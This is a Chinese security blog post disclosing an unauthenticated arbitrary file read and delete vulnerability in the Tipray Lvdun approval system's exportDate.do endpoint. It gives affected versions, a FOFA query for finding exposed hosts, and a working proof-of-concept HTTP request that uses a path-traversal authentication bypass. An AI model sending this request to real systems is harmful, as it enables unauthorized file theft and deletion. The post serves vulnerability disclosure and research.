---
title: "天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞"
source: https://mrxn.net/jswz/trwfe-exportDate-file-read.html
asset_dir: assets/天锐绿盾审批系统-exportdate.do-任意文件读取+删除漏洞
---

# 天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/17 08:20
* 295浏览
* [0评论](#comment)
* 6分钟阅读

深入探索

鉴权

数据库

加密


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞修复方案

该系统的 `exportDate.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。未经身份验证的攻击者可以通过该漏洞读取系统上的任意文件，从而可能获取数据库敏感信息或其他重要配置信息，导致数据泄露。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 文件大小转换

# 漏洞分析

深入探索

计算机安全

身份验证

SQL

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-001-6617e4c2472b.webp)](https://image.mrxn.net/6e78b935fbfd44e1a299d0d03fc74a57.webp)

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-002-2eb9888a91c7.webp)](https://image.mrxn.net/249a6841f8e94ccaa0db508d6104dd7e.webp)

调试信息中可知

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-003-2c85bec21eaa.webp)](https://image.mrxn.net/9cad95e8d0c44ce5b6b18f77b226621f.webp)

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-004-7193481d133e.webp)](https://image.mrxn.net/bb853788e5aa4e11ba3c1d0beca92e6a.webp)

直接将**name**参数的值作为文件操作的最终路径进行读取，无任何过滤或者校验措施，因此造成了任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

> 谨慎测试！会删除读取文件
>
> 漏洞修复方案

```
POST /trwfe/login.jsp/.%2e/config/exportDate.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

name=c:\a.txt
```

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-005-0c454cce4787.webp)](https://image.mrxn.net/ebc9f08d442d460ba727dbb9bd16f6f4.webp)

成功读取到**c:\a.txt**文件内容

网络安全

当然，同时[读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)后的文件也被删除了！

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](https://mrxn.net/jswz/trwfe-exportDate-file-read.html)  
文章链接：<https://mrxn.net/jswz/trwfe-exportDate-file-read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-exportDate-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-exportDate-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 